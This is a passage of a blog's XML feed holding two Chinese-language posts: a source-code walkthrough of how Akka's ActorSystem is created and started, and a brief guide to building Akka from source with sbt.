    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-ActorSystem/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-ActorSystem/</id>
    <published>2021-12-03T06:15:06.161Z</published>
    <updated>2021-12-03T09:07:15.172Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ActorSystem-创建"><a href="#1-ActorSystem-创建" class="headerlink" title="1.ActorSystem-创建"></a>1.ActorSystem-创建</h2><p>使用Akka首先要创建的一个对象就是ActorSystem，那么我们就先分析这个类及其相关的技术细节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String clusterName = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">Config config = ConfigFactory.defaultReference();</span><br><span class="line">config = ConfigFactory.parseMap(<span class="keyword">new</span> HashMap&lt;String, Object&gt;() &#123;&#123;</span><br><span class="line">    put(<span class="string">&quot;akka.actor.provider&quot;</span>, <span class="string">&quot;akka.remote.RemoteActorRefProvider&quot;</span>);</span><br><span class="line">    put(<span class="string">&quot;akka.remote.netty.tcp.hostname&quot;</span>, ip);</span><br><span class="line">    put(<span class="string">&quot;akka.remote.netty.tcp.port&quot;</span>, port);</span><br><span class="line">    put(<span class="string">&quot;akka.remote.netty.tcp.maximum-frame-size&quot;</span>, <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">final</span> String serializer = <span class="string">&quot;protostuff&quot;</span>;</span><br><span class="line">    put(<span class="string">&quot;akka.actor.serializers.&quot;</span> + serializer, ProtoStuffer.class.getName());</span><br><span class="line">&#125;&#125;).withFallback(config);</span><br><span class="line">ActorSystem actorSystem = ActorSystem.create(clusterName, config, ClassUtils.getClassLoader());</span><br></pre></td></tr></table></figure><p>第一步就是创建ActorSystem,以Java调用为例需要如下配置：</p><ul><li>指定系统集群名称：此处为actor路径的一部分</li><li>指定akka配置：配置服务地址及端口以及序列化方式等</li><li>指定类加载器</li></ul><p>配置好上述配置后调用 <strong>ActorSystem.create</strong>创建对象。</p><h3 id="1-1-构建方式"><a href="#1-1-构建方式" class="headerlink" title="1.1. 构建方式"></a>1.1. 构建方式</h3><pre><code>ActorSystem创建主要包含集群名称，配置，类加载器，扩展上下文等。</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1634281544005-af8c6561-fb3a-47c9-9a30-573afd919e9e.png#clientId=u0bf93ba4-028a-4&from=paste&height=339&id=u9b348c8e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=416&originWidth=860&originalType=binary&ratio=1&size=196446&status=done&style=none&taskId=u749292b0-2ae8-4541-90ad-b42138b2788&width=700" alt="image.png"></p><h3 id="1-2-抽象定义"><a href="#1-2-抽象定义" class="headerlink" title="1.2. 抽象定义"></a>1.2. 抽象定义</h3><pre><code>   我们来看ActorSystem类，这是一个抽象类，它继承了ActorRefFactory特质，下面是源码中对该特质的描述。很明显，这个特质是用来创建Actor实例的。我们常用的actorFor和actorSelection是该特质提供的比较重要的方法，当然还有与创建actor有关的其他函数和字段。ActorSystem是一个抽象类，除了继承ActorRefFactory特质的函数和字段之外，定义了一些其他字段和方法，但也都没有具体的实现。</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2021/png/804884/1632368165109-1889528d-e2ed-4f90-9427-9e495cab29a5.png#clientId=ude74a75a-5503-4&from=paste&id=u13243b5e&margin=%5Bobject%20Object%5D&originHeight=1266&originWidth=1004&originalType=url&ratio=1&status=done&style=none&taskId=u14ce8a30-8dc7-4d0f-8473-dd515d9b788"><br>通过跟踪AcotSystem的apply我们发现最终调用了以下代码，主要涉及了两个对象：ActorSystemSetup、ActorSystemImpl。</p><ul><li><p>ActorSystemSetup</p><pre><code>描述是“_A set of setup settings for programmatic configuration of the actor system._”很明显主要是提供一些可编程的配置，我们不再深入这个类。</code></pre></li><li><p>ActorSystemImpl</p><pre><code>是我们需要关心的类，因为ActorSystem.apply最终创建了这个类的实例。</code></pre><h3 id="1-3-抽象实现"><a href="#1-3-抽象实现" class="headerlink" title="1.3. 抽象实现"></a>1.3. 抽象实现</h3><p>  ActorSystemImpl由继承了ExtendedActorSystem，ExtendedActorSystem抽象类提供了有限的几个函数，暴露了ActorRefFactory中本来是protected的函数，也并没有具体的实现，我们也暂时忽略。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Scala API: Creates a new actor system with the specified name and settings</span></span><br><span class="line"><span class="comment"> * The core actor system settings are defined in [[BootstrapSetup]]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">def <span class="title">apply</span><span class="params">(name: String, setup: ActorSystemSetup)</span>: ActorSystem </span>= &#123;</span><br><span class="line">    val bootstrapSettings = setup.get[BootstrapSetup]</span><br><span class="line">        val cl = bootstrapSettings.flatMap(_.classLoader).getOrElse(findClassLoader())</span><br><span class="line">        val appConfig = bootstrapSettings.flatMap(_.config).getOrElse(ConfigFactory.load(cl))</span><br><span class="line">        val defaultEC = bootstrapSettings.flatMap(_.defaultExecutionContext)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> ActorSystemImpl(name, appConfig, cl, defaultEC, None, setup).start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-启动分析"><a href="#2-启动分析" class="headerlink" title="2. 启动分析"></a>2. 启动分析</h2><p>   由于ActorSystemImpl代码比较多，如果从头到尾读一遍代码效率比较低。而且从上面代码可以看出，apply在创建ActorSystemImpl实例之后，调用了start函数，那么我们就从start切入，看看做了哪些操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> lazy val _start: <span class="keyword">this</span>.type = <span class="keyword">try</span> &#123;</span><br><span class="line">  registerOnTermination(stopScheduler())</span><br><span class="line">  <span class="comment">// the provider is expected to start default loggers, LocalActorRefProvider does this</span></span><br><span class="line">  provider.init(<span class="keyword">this</span>)</span><br><span class="line">  <span class="keyword">if</span> (settings.LogDeadLetters &gt; <span class="number">0</span>)</span><br><span class="line">    logDeadLetterListener = Some(systemActorOf(Props[DeadLetterListener], <span class="string">&quot;deadLetterListener&quot;</span>))</span><br><span class="line">  eventStream.startUnsubscriber()</span><br><span class="line">  loadExtensions()</span><br><span class="line">  <span class="keyword">if</span> (LogConfigOnStart) logConfiguration()</span><br><span class="line">  <span class="keyword">this</span></span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(e)</span> ⇒</span></span><br><span class="line"><span class="function">    <span class="keyword">try</span> <span class="title">terminate</span><span class="params">()</span> <span class="keyword">catch</span> </span>&#123; <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(_)</span> ⇒ <span class="title">Try</span><span class="params">(stopScheduler()</span>) &#125;</span></span><br><span class="line"><span class="function">    throw e</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>其实start的代码还是比较清晰的:主要包含</p></li><li><p>registerOnTermination(stopScheduler())</p></li><li><p>provider.init(this)</p></li><li><p>logDeadLetterListener</p></li><li><p>loadExtensions()eventStream.startUnsubscriber()</p></li><li><p>logConfiguration()</p><h3 id="2-1-注册回调"><a href="#2-1-注册回调" class="headerlink" title="2.1 注册回调"></a>2.1 注册回调</h3><pre><code> 首先用registerOnTermination注册了stopScheduler()，也就是给ActorSystem的退出注册了一个回调函数stopScheduler()，这一点也不再具体分析。</code></pre><h3 id="2-2-Provider初始化"><a href="#2-2-Provider初始化" class="headerlink" title="2.2. Provider初始化"></a>2.2. Provider初始化</h3><p>  provider.init(this)这段代码比较重要，从provider的类型来看，它是一个ActorRefProvider，前面我们已经分析过，这是一个用来创建actor的工厂类。provider初始化完成意味着就可以创建actor了，源码注释中也明确的说明了这一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">val provider: ActorRefProvider = <span class="keyword">try</span> &#123;</span><br><span class="line">    val arguments = Vector(</span><br><span class="line">        classOf[String] → name,</span><br><span class="line">        classOf[Settings] → settings,</span><br><span class="line">        classOf[EventStream] → eventStream,</span><br><span class="line">        classOf[DynamicAccess] → dynamicAccess)</span><br><span class="line"></span><br><span class="line">        dynamicAccess.createInstanceFor[ActorRefProvider](ProviderClass, arguments).get</span><br><span class="line">&#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">case</span> <span class="title">NonFatal</span><span class="params">(e)</span> ⇒</span></span><br><span class="line"><span class="function">        <span class="title">Try</span><span class="params">(stopScheduler()</span>)</span></span><br><span class="line"><span class="function">        throw e</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>   上面是provider的创建过程，最重要的一段代码是dynamicAccess.createInstanceFor[ActorRefProvider](ProviderClass, arguments).get，它使用DynamicAccess创建了ActorRefProvider对象的实例。跟踪dynamicAccess创建我们发现这是一个ReflectiveDynamicAccess实例，其实这个类也比较简单，就是从ClassLoader中根据ProviderClass字段加载对应的类并创建对应的实例。ProviderClass定义如下，这是配置文件中经常看到的配置。目前的provider一共有三种：LocalActorRefProvider、akka.remote.RemoteActorRefProvider、akka.cluster.ClusterActorRefProvider，当然我们也可以自定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> val ProviderClass: String =</span><br><span class="line">      setup.get[BootstrapSetup]</span><br><span class="line">        .flatMap(_.actorRefProvider).map(_.identifier)</span><br><span class="line">        .getOrElse(getString(<span class="string">&quot;akka.actor.provider&quot;</span>)) match &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&quot;local&quot;</span>   ⇒ classOf[LocalActorRefProvider].getName</span><br><span class="line">          <span class="comment">// these two cannot be referenced by class as they may not be on the classpath</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&quot;remote&quot;</span>  ⇒ <span class="string">&quot;akka.remote.RemoteActorRefProvider&quot;</span></span><br><span class="line">          <span class="keyword">case</span> <span class="string">&quot;cluster&quot;</span> ⇒ <span class="string">&quot;akka.cluster.ClusterActorRefProvider&quot;</span></span><br><span class="line">          <span class="keyword">case</span> fqcn      ⇒ fqcn</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>   自此provider创建结束，简单来说就是根据配置，通过Class._forName_加载了对应的ActorRefProvider实现类，并把当前的参数传给它，调用对应的构造函数，完成实例的创建。provider创建完成后调用init完成初始化，就可以创建actor了。</p><h3 id="2-3-logDeadLetterListener"><a href="#2-3-logDeadLetterListener" class="headerlink" title="2.3. logDeadLetterListener"></a>2.3. logDeadLetterListener</h3><pre><code>start函数还创建了一个DeadLetterListener类型的actor，这也是我们经常会遇到的。如果给一个不存在的目标actor发消息，或者发送消息超时，都会把消息转发给这个DeadLetter。这就是一个普通的actor，主要用来接收没有发送成功的消息，并把消息打印出来。</code></pre><h3 id="2-4-eventStream-startUnsubscriber"><a href="#2-4-eventStream-startUnsubscriber" class="headerlink" title="2.4. eventStream.startUnsubscriber()"></a>2.4. eventStream.startUnsubscriber()</h3><pre><code>后面还调用了eventStream.startUnsubscriber()，由于eventStream也不是我们关注的重点，先忽略。</code></pre><h3 id="2-5-loadExtensions"><a href="#2-5-loadExtensions" class="headerlink" title="2.5. loadExtensions()"></a>2.5. loadExtensions()</h3><p>   loadExtensions()功能也比较单一，就是根据配置加载ActorSystem的扩展类，并进行注册。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> def <span class="title">loadExtensions</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> throwOnLoadFail Throw exception when an extension fails to load (needed for backwards compatibility)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">def <span class="title">loadExtensions</span><span class="params">(key: String, throwOnLoadFail: Boolean)</span>: Unit </span>= &#123;</span><br><span class="line">      immutableSeq(settings.config.getStringList(key)) foreach &#123; fqcn ⇒</span><br><span class="line">        dynamicAccess.getObjectFor[AnyRef](fqcn) recoverWith &#123; <span class="keyword">case</span> _ ⇒ dynamicAccess.createInstanceFor[AnyRef](fqcn, Nil) &#125; match &#123;</span><br><span class="line">          <span class="function"><span class="keyword">case</span> <span class="title">Success</span><span class="params">(p: ExtensionIdProvider)</span> ⇒ <span class="title">registerExtension</span><span class="params">(p.lookup()</span>)</span></span><br><span class="line"><span class="function">          <span class="keyword">case</span> <span class="title">Success</span><span class="params">(p: ExtensionId[_])</span>      ⇒ <span class="title">registerExtension</span><span class="params">(p)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">case</span> <span class="title">Success</span><span class="params">(other)</span> ⇒</span></span><br><span class="line"><span class="function">            <span class="title">if</span> <span class="params">(!throwOnLoadFail)</span> log.<span class="title">error</span><span class="params">(<span class="string">&quot;[&#123;&#125;] is not an &#x27;ExtensionIdProvider&#x27; or &#x27;ExtensionId&#x27;, skipping...&quot;</span>, fqcn)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">else</span> throw new <span class="title">RuntimeException</span><span class="params">(s<span class="string">&quot;[$fqcn] is not an &#x27;ExtensionIdProvider&#x27; or &#x27;ExtensionId&#x27;&quot;</span>)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">case</span> <span class="title">Failure</span><span class="params">(problem)</span> ⇒</span></span><br><span class="line"><span class="function">            <span class="title">if</span> <span class="params">(!throwOnLoadFail)</span> log.<span class="title">error</span><span class="params">(problem, <span class="string">&quot;While trying to load extension [&#123;&#125;], skipping...&quot;</span>, fqcn)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">else</span> throw new <span class="title">RuntimeException</span><span class="params">(s<span class="string">&quot;While trying to load extension [$fqcn]&quot;</span>, problem)</span></span></span><br><span class="line"><span class="function">        &#125;</span></span><br><span class="line"><span class="function">      &#125;</span></span><br><span class="line"><span class="function">    &#125;</span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">    <span class="comment">// eager initialization of CoordinatedShutdown</span></span></span><br><span class="line"><span class="function">    <span class="title">CoordinatedShutdown</span><span class="params">(<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function">    <span class="title">loadExtensions</span><span class="params">(<span class="string">&quot;akka.library-extensions&quot;</span>, throwOnLoadFail = <span class="keyword">true</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">loadExtensions</span><span class="params">(<span class="string">&quot;akka.extensions&quot;</span>, throwOnLoadFail = <span class="keyword">false</span>)</span></span></span><br><span class="line"><span class="function">  &#125;</span></span><br></pre></td></tr></table></figure><p>    至此，我们就对ActorSystem的创建和启动分析完毕，但还有一些细节需要说明。</p><h3 id="2-6-变量初始化"><a href="#2-6-变量初始化" class="headerlink" title="2.6. 变量初始化"></a>2.6. 变量初始化</h3><pre><code>在start之前还是有一些其他字段的初始化。由于这些字段同样重要，且初始化的顺序没有太大关联，我就按照代码结构从上至下依次分析几个重要的字段。主要包含如下：</code></pre></li><li><p>threadFactory</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> val threadFactory: MonitorableThreadFactory =</span><br><span class="line">    MonitorableThreadFactory(name, settings.Daemonicity, Option(classLoader), uncaughtExceptionHandler)</span><br></pre></td></tr></table></figure><p>   threadFactory这是一个线程工厂类，默认是MonitorableThreadFactory，我们只需要记住这是一个线程工厂类，默认创建ForkJoinWorkerThread的线程就好了。</p></li><li><p>scheduler调度器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val scheduler: Scheduler = createScheduler()</span><br></pre></td></tr></table></figure><p>   scheduler是一个调度器，主要用来定时发送一些消息，这个我们也会经常遇到，但不是此次分析的重点，略过就好。</p></li><li><p>mailboxes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val mailboxes: Mailboxes = <span class="keyword">new</span> Mailboxes(settings, eventStream, dynamicAccess, deadLetters)</span><br></pre></td></tr></table></figure></li></ul><pre><code>  mailboxes是一个非常重要的字段，它是Mailboxes一个实例，用来创建对应的Mailbox，Mailbox用来接收消息，并通过dispatcher分发给对应的actor。</code></pre><ul><li>dispatchers<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">val dispatchers: Dispatchers = <span class="keyword">new</span> Dispatchers(settings, DefaultDispatcherPrerequisites(</span><br><span class="line">    threadFactory, eventStream, scheduler, dynamicAccess, settings, mailboxes, defaultExecutionContext))</span><br><span class="line"> </span><br><span class="line">  val dispatcher: ExecutionContextExecutor = dispatchers.defaultGlobalDispatcher</span><br></pre></td></tr></table></figure></li></ul><p>dispatchers是Dispatchers的一个实例，它用来创建、查询对应的MessageDispatcher。它有一个默认的全局dispatcher，从代码来看，它从配置中读取akka.actor.default-dispatcher，并创建MessageDispatcher实例。MessageDispatcher也是一个非常重要的类，我们后面再具体分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The one and only default dispatcher.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">def defaultGlobalDispatcher: MessageDispatcher = lookup(DefaultDispatcherId)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">object Dispatchers &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The id of the default dispatcher, also the full key of the</span></span><br><span class="line"><span class="comment">   * configuration of the default dispatcher.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">final</span> val DefaultDispatcherId = <span class="string">&quot;akka.actor.default-dispatcher&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code> 到这里我们就算分析完了ActorSystem的创建过程及其技术细节，当然ActorSystem创建只是第一步，后面需要创建actor，actor如何收到dispatcher的消息，还是需要进一步研究的。</code></pre><p>​</p><h2 id="3-参考"><a href="#3-参考" class="headerlink" title="3.参考"></a>3.参考</h2><p><a href="https://www.cnblogs.com/gabry/p/9336477.html">https://www.cnblogs.com/gabry/p/9336477.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ActorSystem-创建&quot;&gt;&lt;a href=&quot;#1-ActorSystem-创建&quot; class=&quot;headerlink&quot; title=&quot;1.ActorSystem-创建&quot;&gt;&lt;/a&gt;1.ActorSystem-创建&lt;/h2&gt;&lt;p&gt;使用Akka首先要创建的一个</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-源码构建</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%BA%90%E7%A0%81%E6%9E%84%E5%BB%BA/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%BA%90%E7%A0%81%E6%9E%84%E5%BB%BA/</id>
    <published>2021-12-03T06:14:54.772Z</published>
    <updated>2021-12-03T08:41:18.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-基础环境依赖"><a href="#1-基础环境依赖" class="headerlink" title="1.基础环境依赖"></a>1.基础环境依赖</h2><ul><li><p>java</p></li><li><p>scala</p></li><li><p>sbt</p><h2 id="2-构建"><a href="#2-构建" class="headerlink" title="2.构建"></a>2.构建</h2></li><li><p>mac安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install sbt</span><br></pre></td></tr></table></figure></li><li><p>编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbt compile</span><br></pre></td></tr></table></figure></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbt test</span><br></pre></td></tr></table></figure></li><li><p>发布</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbt publishLocal</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-基础环境依赖&quot;&gt;&lt;a href=&quot;#1-基础环境依赖&quot; class=&quot;headerlink&quot; title=&quot;1.基础环境依赖&quot;&gt;&lt;/a&gt;1.基础环境依赖&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;java&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;scala&lt;/p&gt;
&lt;/li&gt;</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
</feed>
